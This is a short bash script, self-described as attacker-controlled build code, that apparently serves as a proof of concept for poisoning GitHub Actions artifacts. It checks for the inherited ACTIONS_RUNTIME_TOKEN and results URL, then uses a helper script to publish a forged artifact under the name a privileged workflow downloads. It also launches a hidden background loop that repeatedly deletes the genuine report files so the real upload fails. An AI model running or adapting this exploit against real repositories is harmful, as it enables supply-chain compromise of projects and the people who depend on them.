#!/usr/bin/env bash
# Attacker-controlled build code. Runs as the child of nick-invision/retry@v4
# (a JS action), so it inherits ACTIONS_RUNTIME_TOKEN / ACTIONS_RESULTS_URL.
set -euo pipefail
echo "token=$([ -n "${ACTIONS_RUNTIME_TOKEN:-}" ] && echo yes || echo no) results=$([ -n "${ACTIONS_RESULTS_URL:-}" ] && echo yes || echo no)"

# 1) publish a forged artifact under the exact name the privileged workflow asks for
python3 api.py forge pr-coverage-report

# 2) make sure the real upload step finds no files, so there is no name clash
setsid nohup bash -c 'while :; do rm -rf bull-report pr_number.txt; sleep 0.005; done' \
  > "$RUNNER_TEMP/cleaner.log" 2>&1 < /dev/null &
echo "cleaner started pid=$!"
